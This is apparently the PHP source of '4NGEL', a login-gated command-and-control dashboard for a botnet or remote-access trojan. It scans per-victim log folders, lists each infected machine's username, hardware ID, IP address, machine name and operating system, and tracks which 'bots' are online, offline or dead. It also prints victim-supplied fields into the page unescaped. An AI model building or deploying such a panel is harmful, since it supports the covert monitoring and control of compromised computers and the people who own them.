<?php
	@ini_set("display_errors", 0);
	session_start();
	if(!isset($_SESSION['id'])){
		header("Location: /");
		die();
	}
?>
<!DOCTYPE html>
<html>
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<link rel="stylesheet" type="text/css" href="/css/style.css">
	<link href="https://fonts.googleapis.com/css2?family=Bitter&family=PT+Sans+Narrow&display=swap" rel="stylesheet">
	<link rel="shortcut icon" href="assets/4ngel.jpg">
	<title>4NGEL</title>
</head>
<body>
	<nav>
		<a class="logo" href="/">4NGEL</a>
		<ul class="nav-list">
			<li><a href="/user/profile.php">Options</a></li>
			<li><a href="about.php">About</a></li>
			<li><a href="logout.php">Exit</a></li>
		<ul>
	</nav>
	<center>
		<hr width="75%" noshade>
	</center>
	<div class="infos" align="center">
		<?php

		function getInfos($show){
			$files = array_filter(glob("logs".DIRECTORY_SEPARATOR."*"), "is_dir");
			$qtd = count($files);

			$died = 0;
			$unknow = 0;
			$online = 0;
			$offline = 0;

			for($i=0;$i<$qtd;$i++){

				$file_infos = $files[$i].DIRECTORY_SEPARATOR."control".DIRECTORY_SEPARATOR."infos.txt";
				$file_status = $files[$i].DIRECTORY_SEPARATOR."control".DIRECTORY_SEPARATOR."status.txt";

				if(file_exists($file_infos)){

					$infos = file_get_contents($file_infos);
					$infos = explode("|", $infos);

					if(file_exists($file_status)){

						if(filemtime($file_status) < strtotime("-5 sec"))
							file_put_contents($file_status, "Offline");

						elseif(filemtime($file_status) < strtotime("-7 days"))
							file_put_contents($file_status, "Died");

						$status = file_get_contents($file_status);

						if($status == "Online")
							$online += 1;
						if($status == "Died")
							$died += 1;
						if($status == "Offline")
							$offline += 1;

					} else {
						$status = "Unknow";
						$unknow += 1;
					}

					$all_bots = $offline + $online + $died + $unknow;

					if($show == "infos"){
						echo "
							<tr>
								<td><a href='options.php?hwid=$infos[0]'>$infos[2]</a></td>
								<td>$infos[0]</td>
								<td>$infos[1]</td>
								<td>$infos[3]</td>
								<td>$infos[4]</td>
								<td>$status</td>
							</tr>";
					}
				}
			}
			if($show == "statistics"){
				echo "
					<pre>all bots: $all_bots</pre>
					<pre>online bots: $online</pre>
					<pre>offline bots: $offline</pre>
					<pre>died bots: $died</pre>
					<pre>unknow bots: $unknow</pre>";
			}
		}
		if($_SERVER['SCRIPT_NAME'] == "/home.php"){ ?>

		<div class="main_infos">
			<pre id="title">have a nice experience <?php echo $_SESSION['user'];?></pre><br>
			<?php getInfos("statistics"); ?>
		</div><br>
		<table width="75%" cellspacing="0">
			<tr>
				<th>USERNAME</th>
				<th>HWID</th>
				<th>IP</th>
				<th>MACHINE NAME</th>
				<th>OS</th>
				<th>STATUS</th>
			</tr>
			<?php getInfos("infos"); }?>
		</table>
	</div>
</body>
</html>

<script type="text/javascript">

	function typeWriter(element){
		const arrayChar = element.innerHTML.split('');
		element.innerHTML = '';

		for(let i=0;i<arrayChar.length;i++){
			setTimeout(() => element.innerHTML += arrayChar[i], 80 * i);
		}
	}

	typeWriter(document.getElementById("title"));

</script>